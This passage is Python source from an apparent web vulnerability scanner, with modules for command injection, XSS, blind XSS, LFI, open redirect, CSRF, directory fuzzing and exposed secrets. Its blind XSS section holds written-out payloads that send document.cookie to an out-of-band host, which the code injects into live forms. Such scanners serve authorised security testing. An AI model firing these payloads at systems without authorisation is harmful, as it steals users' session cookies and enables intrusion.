            log(f"  [CMD OOB] {entry.get('url', '')}", Colors.RED, verbose_only=True, verbose=self.verbose)

        return findings

    def _cmd_injection_test_parameter(self, url: str, param: str,
                                      oob_host: Optional[str]) -> tuple[Dict[str, bool], Optional[str]]:
        cmdi_payloads = self._load_payloads("cmdi")
        signals: Dict[str, bool] = {"output": False, "time": False, "oob": False}
        evidence_parts = []
        triggering_response: Optional[str] = None

        # Output-based detection
        for payload, expected in cmdi_payloads.get("unix", CMD_INJECTION_PAYLOADS.get("unix", [])):
            test_url = self._inject_param(url, param, payload)
            resp = safe_get(self.session, test_url, self.timeout)
            if not resp:
                continue
            body = resp.text
            if expected and expected in body:
                signals["output"] = True
                evidence_parts.append(f"output:{expected}")
                triggering_response = resp.text[:500]
                break
            for sig in CMD_INJECTION_OUTPUT_SIGNATURES:
                if sig in body:
                    signals["output"] = True
                    evidence_parts.append(f"output:{sig}")
                    triggering_response = resp.text[:500]
                    break
            if signals["output"]:
                break

        if not signals["output"]:
            for payload, expected in cmdi_payloads.get("windows", CMD_INJECTION_PAYLOADS.get("windows", [])):
                test_url = self._inject_param(url, param, payload)
                resp = safe_get(self.session, test_url, self.timeout)
                if not resp:
                    continue
                body = resp.text
                if expected and expected in body:
                    signals["output"] = True
                    evidence_parts.append(f"output:{expected}")
                    triggering_response = resp.text[:500]
                    break
                for sig in CMD_INJECTION_OUTPUT_SIGNATURES_WIN:
                    if sig in body:
                        signals["output"] = True
                        evidence_parts.append(f"output:{sig}")
                        triggering_response = resp.text[:500]
                        break

        # Time-based detection (with baseline comparison)
        if not signals["output"] and not triggering_response:
            baseline_start = time.time()
            safe_get(self.session, url, timeout=15, raise_for_status=False)
            baseline_delay = time.time() - baseline_start
            for payload, min_delay in cmdi_payloads.get("time_based", CMD_INJECTION_PAYLOADS.get("time_based", [])):
                test_url = self._inject_param(url, param, payload)
                delays = []
                time_resp = None
                for _ in range(2):
                    start = time.time()
                    time_resp = safe_get(self.session, test_url, timeout=15, raise_for_status=False)
                    delays.append(time.time() - start)
                min_delay = min(delays)
                if min_delay > baseline_delay + 4 and all(d > baseline_delay + 3 for d in delays):
                    signals["time"] = True
                    evidence_parts.append(f"time:delays={[round(d, 1) for d in delays]}, baseline={baseline_delay:.2f}s")
                    if time_resp:
                        triggering_response = time_resp.text[:500]
                    break

        # OOB-based detection (always runs regardless of other signals)
        if oob_host:
            for payload_template in cmdi_payloads.get("oob", CMD_INJECTION_PAYLOADS.get("oob", [])):
                payload = payload_template.replace("{oob}", f"{self.oob.callback_token}.{oob_host}")
                test_url = self._inject_param(url, param, payload)
                safe_get(self.session, test_url, self.timeout, raise_for_status=False)
                self.oob.register_interaction("cmd_injection", payload, test_url)
                time.sleep(1)
                callbacks = self.oob.poll()
                if callbacks:
                    signals["oob"] = True
                    evidence_parts.append(f"oob:callback received from {oob_host}")
                else:
                    evidence_parts.append(f"oob:sent to {oob_host} (no callback yet)")
                break

        return signals, triggering_response

    def _cmd_injection_build_finding(self, url: str, param: str,
                                     signals: Dict[str, bool],
                                     request_str: str = "", response_excerpt_str: str = "") -> Optional[dict]:
        signal_count = sum(1 for v in signals.values() if v)
        evidence_parts = [k for k, v in signals.items() if v]

        if signals.get("oob"):
            title = "Confirmed Command Injection (OOB)"
            severity = "critical"
            stage = VerificationStage.EXPLOITABLE.value
        elif signal_count >= 2:
            title = "Command Injection"
            severity = "critical"
            stage = VerificationStage.VALIDATED.value
        elif signal_count >= 1:
            title = "Potential Command Injection"
            severity = "high"
            stage = VerificationStage.DETECTED.value
        else:
            return None

        return finding(
            vuln_type=title,
            url=url,
            severity=severity,
            details=f"Parameter '{param}': {signal_count} signal(s) ({', '.join(evidence_parts)})",
            evidence=" | ".join(evidence_parts),
            request=request_str or _build_curl("GET", url, dict(self.session.headers), cookies=dict(self.session.cookies)),
            response_excerpt=response_excerpt_str,
            verification_stage=stage,
            parameter=param,
            validation_steps=[f"Signal: {s}" for s in evidence_parts],
        )

    # ═════════════════════════════════════════════════════════════════════
    # XSS — Context Detection + Headless Validation
    # ═════════════════════════════════════════════════════════════════════

    def scan_xss(self, target_urls: list[str] | None = None) -> list[dict]:
        """
        Context-aware XSS detection with headless browser validation.
        1. Detect reflection context (HTML, attribute, JS, URL)
        2. Inject context-aware payloads
        3. Verify execution with Playwright (alert/DOM mutation)
        4. Report only execution-verified XSS as Confirmed

        Args:
            target_urls: Optional list of specific URLs to scan. If None, uses all discovered URLs.
        """
        self._prepare_scan()

        # Phase 3: delegate to XSSScanner when enabled
        if self._use_new_scanners:
            from scanners import XSSScanner
            if self._xss_scanner is None:
                self._xss_scanner = XSSScanner(self.config, self.recon)
                self._xss_scanner.session = self.session
            results = self._xss_scanner.scan(target_urls)
            for f in results:
                self._add(f)
            return self._get_findings()

        payloads = self._load_payloads("xss")
        urls = self.recon.get("urls", []) if target_urls is None else target_urls

        # Auto-inject WAF bypass payloads when WAF is detected
        if self.waf_detected:
            bypass = payloads.get("waf_bypass", WAF_BYPASS_XSS)
            reflected = payloads.setdefault("reflected", list(XSS_PAYLOADS))
            reflected.extend(bypass)
            log(f"  [WAF] WAF detected — {len(bypass)} bypass payloads injected into XSS scan", Colors.YELLOW, verbose_only=True, verbose=self.verbose)

        for url in urls:
            if not self._in_scope(url):
                continue
            try:
                for param in parse_qs(urlparse(url).query).keys():
                    self._scan_xss_param(findings := [], url, param, payloads)
                    for result in findings:
                        self._add(result)
            except Exception as e:
                log(f"  [XSS] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        for form in self.recon.get("forms", []):
            try:
                for field in form.get("fields", []):
                    field_name = field.get("name")
                    if not field_name or field.get("type") in ("hidden", "submit", "button"):
                        continue
                    self._scan_xss_form(findings := [], form, field_name, payloads)
                    for result in findings:
                        self._add(result)
            except Exception as e:
                log(f"  [XSS Form] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        # ── DOM XSS scanning via Playwright sink injection ──────────
        dom_probes = payloads.get("dom_probes", DOM_XSS_PROBES)
        for url in urls:
            if not self._in_scope(url):
                continue
            try:
                dom_findings = self.browser.scan_dom_xss(url, dom_probes)
                for df in dom_findings:
                    f = finding(
                        vuln_type=f"DOM-based XSS ({df['sink']})",
                        url=df["url"],
                        severity="high",
                        details=f"DOM sink '{df['sink']}' triggered by probe in {url}",
                        evidence=f"Probe: {df['probe']} | Sink: {df['sink']}",
                        request=_build_curl("GET", url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                        response_excerpt=df.get("body_snippet", "")[:500],
                        verification_stage=VerificationStage.VERIFIED.value,
                        validation_steps=[f"DOM sink '{df['sink']}' executed probe via Playwright"],
                        steps_to_reproduce=[
                            f"Visit {url}",
                            f"DOM sink '{df['sink']}' executes without sanitization",
                            "Observe JavaScript execution in browser context",
                        ],
                    )
                    if f:
                        self._add(f)
            except Exception as e:
                log(f"  [DOM XSS] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        # ── Second-order injection check ────────────────────────────
        try:
            self._check_second_order()
        except Exception as e:
            log(f"  [Second-Order] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        return self._get_findings()

    def _detect_xss_context(self, body: str, payload: str) -> Optional[str]:
        """Detect the context in which the payload is reflected."""
        if payload not in body:
            return None
        # Check script context
        for match in re.finditer(r"<script\b[^>]*>.*?</script>", body, re.IGNORECASE | re.DOTALL):
            if payload in match.group():
                return "javascript"
        # Check attribute context
        if re.search(r"<[^>]+\s[\w:-]+\s*=\s*['\"][^'\"]*" + re.escape(payload), body, re.IGNORECASE):
            return "attribute"
        # Check URL context
        if re.search(r"(href|src|action|formaction)\s*=\s*['\"]?" + re.escape(payload), body, re.IGNORECASE):
            return "url"
        # Check event handler context
        if re.search(r"on\w+\s*=\s*['\"]?" + re.escape(payload), body, re.IGNORECASE):
            return "html"
        # Default HTML context
        return "html"

    def _scan_xss_param(self, findings: list, url: str, param: str, payloads: dict) -> None:
        base = payloads.get("reflected", XSS_PAYLOADS)
        polyglots = payloads.get("polyglot", [])
        all_payloads = list(base) + polyglots

        for payload in all_payloads:
            test_url = self._inject_param(url, param, payload)
            self._record_second_order(url, param, payload)
            resp = safe_get(self.session, test_url, self.timeout)
            if not resp:
                continue

            context = self._detect_xss_context(resp.text, payload)
            if not context:
                continue

            # Use context-aware payloads for this context
            context_payloads = CONTEXT_XSS_PAYLOADS.get(context, [payload])
            for ctx_payload in context_payloads:
                ctx_url = self._inject_param(url, param, ctx_payload)
                ctx_resp = safe_get(self.session, ctx_url, self.timeout)
                if not ctx_resp:
                    continue
                if ctx_payload not in ctx_resp.text and "49" not in ctx_resp.text:
                    continue

                # Stage 1: reflection detected
                # Stage 2: headless validation with screenshot capture
                screenshot_dir = self.config.get("output_dir", "reports")
                exec_result = self.browser.check_xss_execution(ctx_url, ctx_payload, screenshot_dir=screenshot_dir)

                if exec_result and (exec_result.get("alert_fired") or exec_result.get("dom_mutation")):
                    f = finding(
                        vuln_type="Confirmed XSS",
                        url=ctx_url,
                        severity="critical",
                        details=f"Parameter '{param}' — XSS execution verified via Playwright ({context} context)",
                        evidence=f"Payload: {ctx_payload} | Alert: {exec_result.get('alert_fired')} | DOM: {exec_result.get('dom_mutation')}",
                        request=_build_curl("GET", ctx_url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                        response_excerpt=ctx_resp.text[:500],
                        parameter=param,
                        steps_to_reproduce=[f"Send request to {ctx_url}", f"Observe XSS execution: {ctx_payload[:80]}"],
                        verification_stage=VerificationStage.VERIFIED.value,
                        validation_steps=[
                            f"Payload reflected in {context} context",
                            f"Playwright confirmed execution: alert={exec_result.get('alert_fired')}, dom={exec_result.get('dom_mutation')}",
                        ],
                    )
                    if f:
                        if exec_result.get("screenshot_path"):
                            f["screenshot_path"] = exec_result["screenshot_path"]
                        findings.append(f)
                    log(f"  [XSS Verified] {ctx_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
                else:
                    f = finding(
                        vuln_type="Reflected XSS",
                        url=ctx_url,
                        severity="high",
                        details=f"Parameter '{param}' reflects payload in {context} context (unverified execution)",
                        evidence=f"Payload: {ctx_payload}",
                        request=_build_curl("GET", ctx_url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                        response_excerpt=ctx_resp.text[:500],
                        parameter=param,
                        steps_to_reproduce=[f"Send request to {ctx_url}", f"Observe payload reflection: {ctx_payload[:80]}"],
                        verification_stage=VerificationStage.DETECTED.value,
                        validation_steps=[f"Reflection in {context} context detected (no headless browser available for execution verification)"],
                    )
                    if f:
                        findings.append(f)
                    log(f"  [XSS Detected] {ctx_url[:80]}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
                break

    def _scan_xss_form(self, findings: list, form: dict, field_name: str, payloads: dict) -> None:
        action = form.get("action", "")
        method = form.get("method", "get").upper()
        base_payloads = payloads.get("reflected", XSS_PAYLOADS)
        polyglots = payloads.get("polyglot", [])
        all_payloads = list(base_payloads) + polyglots

        for payload in all_payloads:
            data = {f["name"]: f.get("value", "test") for f in form.get("fields", []) if f.get("name")}
            data[field_name] = payload
            self._record_second_order(action or "", field_name, payload)

            if method == "POST":
                resp = safe_post(self.session, action, data, self.timeout)
                confirm_url = action + "?" + urlencode(data)
            else:
                confirm_url = action + "?" + urlencode(data)
                resp = safe_get(self.session, confirm_url, self.timeout)

            if not resp:
                continue

            context = self._detect_xss_context(resp.text, payload)
            if not context:
                continue

            context_payloads = CONTEXT_XSS_PAYLOADS.get(context, [payload])
            for ctx_payload in context_payloads:
                d2 = dict(data)
                d2[field_name] = ctx_payload

                if method == "POST":
                    r = safe_post(self.session, action, d2, self.timeout)
                else:
                    r = safe_get(self.session, action + "?" + urlencode(d2), self.timeout)

                if not r:
                    continue
                if ctx_payload not in r.text and "49" not in r.text:
                    continue

                screenshot_dir = self.config.get("output_dir", "reports")
                exec_result = self.browser.check_xss_execution(confirm_url, ctx_payload, html_content=r.text if method == "POST" else None, screenshot_dir=screenshot_dir)

                if exec_result and (exec_result.get("alert_fired") or exec_result.get("dom_mutation")):
                    f = finding(
                        vuln_type="Confirmed XSS",
                        url=confirm_url,
                        severity="critical",
                        details=f"Form field '{field_name}' — XSS execution verified ({context} context)",
                        evidence=f"Payload: {ctx_payload}",
                        request=_build_curl(method, confirm_url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                        response_excerpt=r.text[:500],
                        parameter=field_name,
                        steps_to_reproduce=[f"Send {method} request to {confirm_url}", f"Observe XSS execution: {ctx_payload[:80]}"],
                        verification_stage=VerificationStage.VERIFIED.value,
                        validation_steps=["Form reflection + Playwright execution verified",
                                          f"Screenshot: {exec_result.get('screenshot_path', 'N/A')}"],
                    )
                    if f:
                        if exec_result.get("screenshot_path"):
                            f["screenshot_path"] = exec_result["screenshot_path"]
                        findings.append(f)
                    log(f"  [XSS Form Verified] {confirm_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
                else:
                    f = finding(
                        vuln_type="Reflected XSS",
                        url=confirm_url,
                        severity="high",
                        details=f"Form field '{field_name}' reflects in {context} context",
                        evidence=f"Payload: {ctx_payload}",
                        request=_build_curl(method, confirm_url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                        response_excerpt=r.text[:500],
                        parameter=field_name,
                        steps_to_reproduce=[f"Send {method} request to {confirm_url}", f"Observe payload reflection: {ctx_payload[:80]}"],
                        verification_stage=VerificationStage.DETECTED.value,
                        validation_steps=[f"Reflection in {context} context (unverified execution)"],
                    )
                    if f:
                        findings.append(f)
                    log(f"  [XSS Form Detected] {confirm_url[:80]}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
                break

    # ═════════════════════════════════════════════════════════════════════
    # Blind XSS — OOB-Based Stored XSS Detection
    # ═════════════════════════════════════════════════════════════════════

    def scan_blind_xss(self) -> list[dict]:
        """
        Blind / Stored XSS detection via OOB callbacks.

        Injects payloads that make outbound requests when executed by a
        victim (stored XSS) and waits for OOB callbacks to confirm execution.
        """
        oob_host = self.config.get("oob_host")
        if not oob_host:
            log("[!] Blind XSS skipped — provide --oob-host for OOB callback verification", Colors.YELLOW)
            return self._get_findings()

        blind_payloads = [
            f'<script>fetch("http://{self.oob.callback_token}.{oob_host}/blind?c="+document.cookie)</script>',
            f'<img src=x onerror=fetch("http://{self.oob.callback_token}.{oob_host}/blind?c="+document.cookie)>',
            f'<svg/onload=fetch("http://{self.oob.callback_token}.{oob_host}/blind?c="+document.cookie)>',
            f'<input autofocus onfocus=fetch("http://{self.oob.callback_token}.{oob_host}/blind?c="+document.cookie)>',
            f'<body onload=fetch("http://{self.oob.callback_token}.{oob_host}/blind?c="+document.cookie)>',
            f'<script>new Image().src="http://{self.oob.callback_token}.{oob_host}/blind?c="+document.cookie</script>',
        ]

        for form in self.recon.get("forms", []):
            try:
                action = form.get("action", "")
                method = form.get("method", "get").upper()
                fields = form.get("fields", [])

                text_fields = [
                    f for f in fields
                    if f.get("type") in ("text", "textarea", "email", "url", "search", None)
                    and f.get("name")
                ]

                for field in text_fields[:3]:  # Limit to first 3 text fields
                    for payload in blind_payloads:
                        data = {
                            f["name"]: f.get("value", "test")
                            for f in fields if f.get("name")
                        }
                        data[field["name"]] = payload

                        if method == "POST":
                            safe_post(self.session, action, data, self.timeout,
                                      raise_for_status=False)
                        else:
                            safe_get(self.session, action + "?" + urlencode(data),
                                     self.timeout, raise_for_status=False)

                        self.oob.register_interaction("blind_xss", payload, action)
                        log(f"  [Blind XSS] Injected in {field['name']} → {action}",
                            Colors.YELLOW, verbose_only=True, verbose=self.verbose)
            except Exception as e:
                log(f"  [Blind XSS] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        # Also test URL parameters (for reflected that may be stored server-side)
        for url in self._urls_with_params():
            if not self._in_scope(url):
                continue
            for param in parse_qs(urlparse(url).query).keys():
                for payload in blind_payloads[:2]:
                    test_url = self._inject_param(url, param, payload)
                    safe_get(self.session, test_url, self.timeout, raise_for_status=False)
                    self.oob.register_interaction("blind_xss", payload, test_url)

        # Poll OOB for callbacks
        confirmed_oob = self.oob.poll()
        for entry in confirmed_oob:
            f = finding(
                vuln_type="Blind XSS (Stored)",
                url=entry.get("url", ""),
                severity="critical",
                details="Blind XSS confirmed via OOB callback — payload executed by victim browser, callback received",
                evidence=f"Callback: {entry.get('payload', '')[:200]}",
                request=_build_curl("POST", entry.get("url", ""), dict(self.session.headers), data={"field": entry.get("payload", "")}),
                response_excerpt="(confirmed via OOB callback — JavaScript executed in victim browser, callback containing cookie/session data received)",
                verification_stage=VerificationStage.VERIFIED.value,
                validation_steps=[
                    "Payload injected into form field or URL parameter",
                    "OOB callback received: JavaScript executed in victim browser, callback with browser data received",
                ],
                steps_to_reproduce=[
                    f"Inject Blind XSS payload into form field at {entry.get('url', '')}",
                    "When victim/staff views the stored content, the payload executes",
                    "Observe OOB callback containing victim's cookie, session, or page content",
                ],
            )
            if f and self._add(f):
                findings.append(f)
            log(f"  [Blind XSS OOB] {entry.get('url', '')}", Colors.RED, verbose_only=True, verbose=self.verbose)

        return findings

    # ═════════════════════════════════════════════════════════════════════
    # LFI
    # ═════════════════════════════════════════════════════════════════════

    def scan_lfi(self, target_urls: list[str] | None = None) -> list[dict]:
        findings: list[dict] = []
        lfi_payloads = self._load_payloads("lfi")
        raw_urls = self._urls_with_params() if target_urls is None else [u for u in target_urls if "?" in u]
        for url in raw_urls:
            if not self._in_scope(url):
                continue
            try:
                parsed = urlparse(url)
                params = list(parse_qs(parsed.query).keys())
                for param in params:
                    # Baseline: fetch with original param value
                    baseline_resp = safe_get(self.session, url, self.timeout)
                    baseline_body = baseline_resp.text if baseline_resp else ""
                    for payload in lfi_payloads:
                        try:
                            test_url = self._inject_param(url, param, payload)
                            resp = safe_get(self.session, test_url, self.timeout)
                            if resp:
                                body = resp.text
                                for sig in LFI_SIGNATURES:
                                    if sig in body and sig not in baseline_body:
                                        f = finding(
                                            vuln_type="Local File Inclusion",
                                            url=test_url,
                                            severity="critical",
                                            details=f"Parameter '{param}' includes local file (signature: {sig!r})",
                                            evidence=f"Payload: {payload}",
                                            request=_build_curl("GET", test_url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                                            response_excerpt=resp.text[:500],
                                            parameter=param,
                                            steps_to_reproduce=[f"Send request to {test_url}", f"Observe: {sig}"],
                                            verification_stage=VerificationStage.VALIDATED.value,
                                            validation_steps=[f"LFI signature '{sig}' found in response"],
                                        )
                                        if f and self._add(f):
                                            findings.append(f)
                                        log(f"  [LFI] {test_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
                                        break
                        except Exception:
                            continue
            except Exception:
                continue
        return findings

    # ═════════════════════════════════════════════════════════════════════
    # Open Redirect
    # ═════════════════════════════════════════════════════════════════════

    def scan_open_redirect(self, target_urls: list[str] | None = None) -> list[dict]:
        findings: list[dict] = []
        urls = self.recon.get("urls", []) if target_urls is None else target_urls
        for url in urls:
            if not self._in_scope(url):
                continue
            try:
                params = list(parse_qs(urlparse(url).query).keys())
                redirect_params = [p for p in params if p.lower() in REDIRECT_PARAMS]
                if not redirect_params:
                    continue
                for param in redirect_params:
                    for payload in OPEN_REDIRECT_PAYLOADS:
                        try:
                            test_url = self._inject_param(url, param, payload)
                            resp = safe_get(self.session, test_url, self.timeout, allow_redirects=False)
                            if not resp:
                                continue
                            loc = resp.headers.get("Location", "")
                            if "evil.com" in loc:
                                f = finding(
                                    vuln_type="Open Redirect",
                                    url=test_url,
                                    severity="medium",
                                    details=f"Parameter '{param}' redirects to external domain",
                                    evidence=f"Location: {loc[:100]}",
                                    request=_build_curl("GET", test_url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                                    response_excerpt=resp.text[:500],
                                    parameter=param,
                                    steps_to_reproduce=[f"Send request to {test_url}", f"Observe redirect to {loc[:80]}"],
                                    verification_stage=VerificationStage.VALIDATED.value,
                                    validation_steps=[f"Redirect header contains external domain: {loc[:60]}"],
                                )
                                if f and self._add(f):
                                    findings.append(f)
                                log(f"  [REDIRECT] {test_url[:80]}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
                                break
                        except Exception:
                            continue
            except Exception:
                continue
        return findings

    # ═════════════════════════════════════════════════════════════════════
    # CSRF
    # ═════════════════════════════════════════════════════════════════════

    def scan_csrf(self, target_urls: list[str] | None = None) -> list[dict]:
        findings: list[dict] = []
        forms = self.recon.get("forms", [])
        if target_urls is not None:
            origins = {urlparse(u).scheme + "://" + urlparse(u).netloc for u in target_urls}
            forms = [
                f for f in forms
                if any(urlparse(f.get("action", f.get("url", ""))).scheme + "://" + urlparse(f.get("action", f.get("url", ""))).netloc == o for o in origins)
            ]
        for form in forms:
            try:
                form_action = form.get("action", form.get("url", ""))
                if form_action and not self._in_scope(form_action):
                    continue
                if form.get("method", "GET").upper() != "POST":
                    continue
                token_found = any(
                    f.get("name", "").lower() in CSRF_TOKEN_NAMES
                    for f in form.get("fields", [])
                )
                if not token_found:
                    f = finding(
                        vuln_type="Missing CSRF Protection",
                        url=form_action,
                        severity="medium",
                        details="POST form does not contain a known anti-CSRF token field",
                        evidence=f"Form fields: {[fld.get('name') for fld in form.get('fields', [])]}",
                        request=_build_curl("POST", form_action, {}, data={
                            fld.get("name", "field"): fld.get("value", "test")
                            for fld in form.get("fields", [])[:5]
                        }),
                        response_excerpt="(no request made — vulnerability detected from form structure)",
                        steps_to_reproduce=[
                            f"Navigate to the page containing the form at {form_action}",
                            "Submit the POST form without a CSRF token",
                            "Observe that the server accepts the request without token validation",
                        ],
                        verification_stage=VerificationStage.DETECTED.value,
                    )
                    if f and self._add(f):
                        findings.append(f)
                    log(f"  [CSRF] {form_action}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
            except Exception:
                continue
        return findings

    # ═════════════════════════════════════════════════════════════════════
    # Directory Fuzzing
    # ═════════════════════════════════════════════════════════════════════

    def scan_directory_fuzz(self) -> list[dict]:
        findings: list[dict] = []
        urls = self.recon.get("urls", [])
        if not urls:
            return self._get_findings()

        base = urlparse(self.config.get("target", "")).netloc
        if not base:
            return self._get_findings()

        paths = COMMON_DIRFUZZ_PATHS[:]
        custom_wordlist = self.config.get("wordlist")
        if custom_wordlist:
            try:
                with open(custom_wordlist, "r", encoding="utf-8") as f:
                    for line in f:
                        line = line.strip()
                        if line and line not in paths:
                            paths.append(line)
            except Exception:
                pass

        delay = self.config.get("delay", 0)
        for path in paths:
            try:
                target_url = f"{self.config.get('target').rstrip('/')}/{path.lstrip('/')}"
                if not self._in_scope(target_url):
                    continue
                resp = safe_get(self.session, target_url, self.timeout, raise_for_status=False)
                if delay:
                    time.sleep(delay)
                if resp and resp.status_code == 200:
                    title = "Exposed Common Path"
                    details = f"Accessible path found: {target_url}"
                    if any(kw in resp.text.lower() for kw in ["index of /", "directory listing", "parent directory"]):
                        title = "Directory Listing Enabled"
                        details = f"Index listing detected at {target_url}"
                    f = finding(
                        vuln_type=title,
                        url=target_url,
                        severity="medium",
                        details=details,
                        evidence=f"HTTP {resp.status_code}",
                        request=_build_curl("GET", target_url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                        response_excerpt=resp.text[:500],
                        steps_to_reproduce=[f"Send request to {target_url}", "Observe HTTP 200 response"],
                        verification_stage=VerificationStage.DETECTED.value,
                    )
                    if f and self._add(f):
                        findings.append(f)
                    log(f"  [DIRB] {target_url}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
                elif resp and resp.status_code == 403:
                    f = finding(
                        vuln_type="Forbidden Path (Access Control Exists)",
                        url=target_url,
                        severity="info",
                        details=f"Path exists but is access-controlled (HTTP 403): {target_url}",
                        evidence=f"HTTP 403",
                        request=_build_curl("GET", target_url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                        response_excerpt=resp.text[:500],
                        steps_to_reproduce=[f"Send request to {target_url}", "Observe HTTP 403 response"],
                        verification_stage=VerificationStage.DETECTED.value,
                    )
                    if f and self._add(f):
                        findings.append(f)
                    log(f"  [DIRB 403] {target_url}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
                elif resp and resp.status_code == 401:
                    f = finding(
                        vuln_type="Authentication Required Path",
                        url=target_url,
                        severity="info",
                        details=f"Path requires authentication (HTTP 401): {target_url}",
                        evidence=f"HTTP 401",
                        request=_build_curl("GET", target_url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                        response_excerpt=resp.text[:500],
                        steps_to_reproduce=[f"Send request to {target_url}", "Observe HTTP 401 response"],
                        verification_stage=VerificationStage.DETECTED.value,
                    )
                    if f and self._add(f):
                        findings.append(f)
                    log(f"  [DIRB 401] {target_url}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
            except Exception:
                continue
        return findings

    # ═════════════════════════════════════════════════════════════════════
    # Exposed Files
    # ═════════════════════════════════════════════════════════════════════

    def scan_exposed_files(self) -> list[dict]:
        findings: list[dict] = []
        target_base = self.config.get("target", "").rstrip("/")
        for exposed_file in EXPOSED_FILES:
            try:
                file_url = target_base + exposed_file
                if not self._in_scope(file_url):
                    continue
                resp = safe_get(self.session, file_url, self.timeout, raise_for_status=False)
                if not (resp and resp.status_code == 200):
                    continue
                severity, details = self._exposed_file_metadata(exposed_file)
                body = resp.text
                ext = exposed_file.lower()
                content_ok = True
                if ".env" in ext and "=" not in body:
                    content_ok = False
                elif "/.git/config" in ext and "[core]" not in body:
                    content_ok = False
                elif "phpinfo" in ext and "PHP Version" not in body:
                    content_ok = False
                elif any(ext.endswith(s) for s in (".zip", ".tar.gz", ".gz", ".sql")):
                    raw = resp.content
                    if ext.endswith(".zip") and raw[:2] != b"PK":
                        content_ok = False
                    elif ext.endswith(".gz") and raw[:2] != b"\x1f\x8b":
                        content_ok = False
                    elif ext.endswith(".sql") and not any(body.lstrip().startswith(w) for w in ("-- ", "CREATE", "INSERT", "DROP", "ALTER", "SELECT")):
                        content_ok = False
                if not content_ok:
                    severity = "info"
                    details += " (content check failed — may be a generic 200 response)"
                f = finding(
                    vuln_type="Exposed Sensitive File",
                    url=file_url,
                    severity=severity,
                    details=details,
                    evidence=f"HTTP {resp.status_code} — {len(resp.text)} bytes",
                    request=_build_curl("GET", file_url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                    response_excerpt=resp.text[:500],
                    steps_to_reproduce=[f"Send request to {file_url}", f"Observe: {details[:100]}"],
                    verification_stage=VerificationStage.VALIDATED.value,
                    validation_steps=[f"File accessible at {file_url} (HTTP 200)"],
                )
                if f and self._add(f):
                    findings.append(f)
                log(f"  [EXPOSED] {file_url}", Colors.RED, verbose_only=True, verbose=self.verbose)
            except Exception:
                continue
        return findings

    def _exposed_file_metadata(self, exposed_file: str) -> tuple[str, str]:
        lower_path = exposed_file.lower()
        if ".env" in exposed_file or "config" in lower_path:
            return "critical", "Configuration file containing potential secrets is accessible"
        if "backup" in lower_path:
            return "high", "Backup archive is publicly accessible"
        if ".git" in exposed_file or ".DS_Store" in exposed_file:
            return "high", "Version control metadata is exposed"
        if "phpinfo" in exposed_file:
            return "high", "PHP information disclosure via phpinfo()"
        if ".ssh" in exposed_file or ".aws" in exposed_file:
            return "critical", "Credentials file is publicly accessible"
        return "critical", "Sensitive file is publicly accessible"

    # ═════════════════════════════════════════════════════════════════════
    # Sensitive Data
    # ═════════════════════════════════════════════════════════════════════

    def scan_sensitive_data(self, target_urls: list[str] | None = None) -> list[dict]:
        from modules.utils import SecretValidator
        findings: list[dict] = []
        urls = self.recon.get("urls", []) if target_urls is None else target_urls
        for url in urls:
            if not self._in_scope(url):
                continue
            parsed_path = urlparse(url).path.lower()
            if any(parsed_path.endswith(ext) for ext in (".css", ".png", ".jpg", ".gif", ".svg", ".woff", ".woff2", ".ttf", ".ico", ".mp4", ".pdf")):
                continue
            try:
                resp = safe_get(self.session, url, self.timeout, raise_for_status=False)
                if not resp or not resp.text:
                    continue
                body = resp.text
                for label, pattern in SENSITIVE_PATTERNS:
                    match = pattern.search(body)
                    if match:
                        value = match.group(0)[:120]
                        validation_steps = ["Secret pattern matched in page content"]

                        # Validate if the secret type supports it
                        secret_type_map = {
                            "AWS Access Key": "aws_access_key",
                            "AWS Secret Key": "aws_secret_key",
                            "GitHub Token": "github_token",
                            "Slack Token": "slack_token",
                        }
                        secret_type = secret_type_map.get(label)
                        validation_result = None
                        if secret_type:
                            validation_result = SecretValidator.validate(secret_type, value)
                            result_label = {
                                True: "Valid",
                                False: "Invalid",
                                None: "Unknown",
                            }.get(validation_result.get("valid"))
                            validation_steps.append(
                                f"Secret validation: {result_label} — {validation_result.get('details', '')}"
                            )

                        evidence_parts = [f"Matched: {value}"]
                        if validation_result and validation_result.get("valid") is True:
                            severity = "critical"
                            evidence_parts.append(f"Validated: {validation_result.get('details', '')}")
                        elif validation_result and validation_result.get("valid") is False:
                            severity = "info"
                            evidence_parts.append("Token invalid/revoked — no risk")
                        else:
                            severity = "high" if "key" in label.lower() else "medium"

                        f = finding(
                            vuln_type=f"Sensitive Data Exposure ({label})",
                            url=url,
                            severity=severity,
                            details=f"Potential sensitive value detected in page content: {label}",
                            evidence=" | ".join(evidence_parts),
                            request=_build_curl("GET", url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                            response_excerpt=resp.text[:500],
                            steps_to_reproduce=[f"Send request to {url}", f"Observe {label} in response"],
                            verification_stage=VerificationStage.VALIDATED.value if (validation_result and validation_result.get("valid") is True) else VerificationStage.DETECTED.value,
                            validation_steps=validation_steps,
                        )
                        if f and self._add(f):
                            findings.append(f)
                        log(f"  [SENSITIVE] {url} - {label}", Colors.RED, verbose_only=True, verbose=self.verbose)
            except Exception:
                continue
        return findings

    # ═════════════════════════════════════════════════════════════════════
    # Headers
    # ═════════════════════════════════════════════════════════════════════

    def scan_headers(self) -> list[dict]:
